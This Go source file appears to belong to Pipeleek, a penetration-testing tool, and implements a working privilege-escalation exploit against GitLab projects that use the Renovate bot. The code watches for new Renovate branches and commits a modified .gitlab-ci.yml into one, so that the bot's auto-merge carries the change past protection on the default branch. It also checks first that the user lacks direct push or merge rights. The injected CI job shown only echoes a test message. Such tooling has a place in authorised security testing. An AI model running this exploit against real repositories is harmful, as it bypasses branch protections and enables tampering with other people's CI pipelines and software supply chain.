package renovate

import (
	"time"

	"github.com/CompassSecurity/pipeleek/pkg/gitlab/util"
	pkgrenovate "github.com/CompassSecurity/pipeleek/pkg/renovate"
	"github.com/rs/zerolog/log"
	gogitlab "gitlab.com/gitlab-org/api/client-go"
	ci "gitlab.com/mitchenielsen/gitlab-ci-go"
	"gopkg.in/yaml.v3"
)

func RunExploit(gitlabUrl, gitlabApiToken, repoName, renovateBranchesRegex, monitoringIntervalStr string) {
	log.Info().Msg("Ensure the Renovate bot does have a greater access level than you, otherwise this will not work, and is able to auto merge into the protected main branch")

	git, err := util.GetGitlabClient(gitlabApiToken, gitlabUrl)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed creating gitlab client")
	}

	project, _, err := git.Projects.GetProject(repoName, &gogitlab.GetProjectOptions{})
	if err != nil {
		log.Fatal().Stack().Err(err).Str("repoName", repoName).Msg("Unable to retrieve project information")
	}

	// Create branch monitor
	branchMonitor, err := pkgrenovate.NewBranchMonitor(renovateBranchesRegex)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("The provided renovate-branches-regex regex is invalid")
	}

	monitoringInterval, err := time.ParseDuration(monitoringIntervalStr)
	if err != nil {
		log.Fatal().Stack().Err(err).Str("interval", monitoringIntervalStr).Msg("Failed to parse monitoring-interval duration")
	}

	projectAccessLevel := getUserAccessLevel(project)
	if projectAccessLevel < gogitlab.DeveloperPermissions {
		log.Fatal().Any("projectAccessLevel", projectAccessLevel).Msg("You (probably) need at least Developer permissions to exploit this vulnerability, you must be able to push to the Renovate Bot created branches branches")
	}

	ciCdYml, err := util.FetchCICDYml(git, project.ID)
	if ciCdYml == "" || err != nil {
		log.Fatal().Err(err).Any("cicd", ciCdYml).Msg("No CI/CD configuration found auto merging is thus impossible, please ensure the project has a .gitlab-ci.yml file")
	}

	checkDefaultBranchProtections(git, project, projectAccessLevel)

	log.Info().Msg("Monitoring for new Renovate Bot branches to exploit")
	branch := monitorBranches(git, project, branchMonitor, monitoringInterval)
	cicd := getBranchCiCdYml(git, project, *branch)
	log.Info().Str("branch", branch.Name).Msg("Modifying CI/CD configuration")
	cicd["pipeleek-renovate-privesc"] = ci.JobConfig{
		Stage:        "test",
		Image:        "alpine:latest",
		Script:       []string{"echo 'This is a test job for Pipeleek Renovate Privilege Escalation exploit'"},
		AllowFailure: true,
	}

	updateCiCdYml(cicd, git, project, *branch)

	// Log shared exploit instructions
	pkgrenovate.LogExploitInstructions(branch.Name, project.DefaultBranch)
	listBranchMRs(git, project, *branch)
}

func getUserAccessLevel(project *gogitlab.Project) gogitlab.AccessLevelValue {
	var groupAccess, projectAccess gogitlab.AccessLevelValue = -1, -1

	if project.Permissions != nil {
		if project.Permissions.GroupAccess != nil {
			groupAccess = project.Permissions.GroupAccess.AccessLevel
		}
		if project.Permissions.ProjectAccess != nil {
			projectAccess = project.Permissions.ProjectAccess.AccessLevel
		}
	}

	if groupAccess > projectAccess {
		return groupAccess
	}

	return projectAccess
}

func checkDefaultBranchProtections(git *gogitlab.Client, project *gogitlab.Project, currentAccessLevel gogitlab.AccessLevelValue) {
	protectedbranch, _, err := git.ProtectedBranches.GetProtectedBranch(project.ID, project.DefaultBranch)
	if err != nil {
		log.Error().Err(err).Msg("Failed to check if the default branch is protected")
	}

	for _, accessLevel := range protectedbranch.PushAccessLevels {
		log.Debug().Str("branch", project.DefaultBranch).Any("userAccessLevel", currentAccessLevel).Any("requiredAccessLevel", accessLevel.AccessLevel).Msg("Testing push access level for default branch")
		if currentAccessLevel >= accessLevel.AccessLevel {
			log.Fatal().Str("branch", project.DefaultBranch).Any("userAccessLevel", currentAccessLevel).Any("requiredAccessLevel", accessLevel.AccessLevel).Msg("You can already push to the default branch, no need to exploit")
		}
	}

	for _, accessLevel := range protectedbranch.MergeAccessLevels {
		log.Debug().Str("branch", project.DefaultBranch).Any("userAccessLevel", currentAccessLevel).Any("requiredAccessLevel", accessLevel.AccessLevel).Msg("Testing merge access level for default branch")
		if currentAccessLevel >= accessLevel.AccessLevel {
			log.Fatal().Str("branch", project.DefaultBranch).Any("userAccessLevel", currentAccessLevel).Any("requiredAccessLevel", accessLevel.AccessLevel).Msg("You can already merge to the default branch, no need to exploit")
		}
	}

	log.Info().Str("branch", project.DefaultBranch).Any("currentAccessLevel", currentAccessLevel).Msg("Default branch is protected and you do not have direct access, proceeding with exploit")
}

func monitorBranches(git *gogitlab.Client, project *gogitlab.Project, branchMonitor *pkgrenovate.BranchMonitor, monitoringInterval time.Duration) *gogitlab.Branch {
	isFirstScan := true

	for {
		log.Debug().Msg("Checking for new branches created by Renovate Bot")
		branches, _, err := git.Branches.ListBranches(project.ID, &gogitlab.ListBranchesOptions{
			ListOptions: gogitlab.ListOptions{
				PerPage: 100,
			}})

		if err != nil {
			log.Error().Err(err).Msg("Failed to list branches, retrying ...")
		}

		if isFirstScan {
			log.Debug().Msg("Storing original branches for comparison")
			if len(branches) == 100 {
				log.Warn().Msg("More than 100 branches found, new branches might not be detected, improve this logic here in a PR thx ;)")
			}
		}

		for _, branch := range branches {
			if branchMonitor.CheckBranch(branch.Name, isFirstScan) {
				log.Info().Str("branch", branch.Name).Msg("Starting exploit process")
				return branch
			}
		}

		isFirstScan = false
		time.Sleep(monitoringInterval)
	}
}

func getBranchCiCdYml(git *gogitlab.Client, project *gogitlab.Project, branch gogitlab.Branch) map[string]interface{} {
	log.Info().Str("branch", branch.Name).Msg("Fetching .gitlab-ci.yml file from Renovate branch")
	rawYml, _, err := git.RepositoryFiles.GetRawFile(project.ID, ".gitlab-ci.yml", &gogitlab.GetRawFileOptions{
		Ref: gogitlab.Ptr(branch.Name),
	})

	if err != nil {
		log.Fatal().Stack().Err(err).Str("branch", branch.Name).Msg("Failed to retrieve .gitlab-ci.yml file from Renovate branch")
	}

	var ciCdConfig map[string]interface{}
	err = yaml.Unmarshal(rawYml, &ciCdConfig)
	if err != nil {
		log.Fatal().Stack().Str(".gitlab-ci.yml", string(rawYml)).Err(err).Msg("Failed to unmarshal CI/CD configuration of the Renovate branch")
	}

	return ciCdConfig
}

func updateCiCdYml(yml map[string]interface{}, git *gogitlab.Client, project *gogitlab.Project, branch gogitlab.Branch) {
	log.Info().Str("branch", branch.Name).Msg("Modifying .gitlab-ci.yml file in Renovate branch")
	cicdYaml, err := yaml.Marshal(yml)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed to marshal CI/CD configuration for the Renovate branch")
	}

	fileInfo, _, err := git.RepositoryFiles.UpdateFile(project.ID, ".gitlab-ci.yml", &gogitlab.UpdateFileOptions{
		Branch:        gogitlab.Ptr(branch.Name),
		Content:       gogitlab.Ptr(string(cicdYaml)),
		CommitMessage: gogitlab.Ptr("Update .gitlab-ci.yml for Pipeleek Renovate Privilege Escalation exploit"),
	})

	if err != nil {
		log.Fatal().Stack().Err(err).Str("branch", branch.Name).Msg("Failed to update .gitlab-ci.yml file in Renovate branch")
	}

	log.Info().Str("branch", branch.Name).Any("fileinfo", fileInfo).Msg("Updated remote .gitlab-ci.yml file in Renovate branch")
}

func listBranchMRs(git *gogitlab.Client, project *gogitlab.Project, branch gogitlab.Branch) {
	opts := &gogitlab.ListProjectMergeRequestsOptions{
		SourceBranch: gogitlab.Ptr(branch.Name),
		TargetBranch: gogitlab.Ptr(project.DefaultBranch),
	}

	mergeRequests, _, err := git.MergeRequests.ListProjectMergeRequests(project.ID, opts)

	if err != nil {
		log.Error().Err(err).Msg("Failed to list merge requests for branch, go check manually")
		return
	}

	for _, mr := range mergeRequests {
		log.Info().Str("mr", mr.Title).Str("url", mr.WebURL).Msg("Found merge request for targeted branch")
	}
}
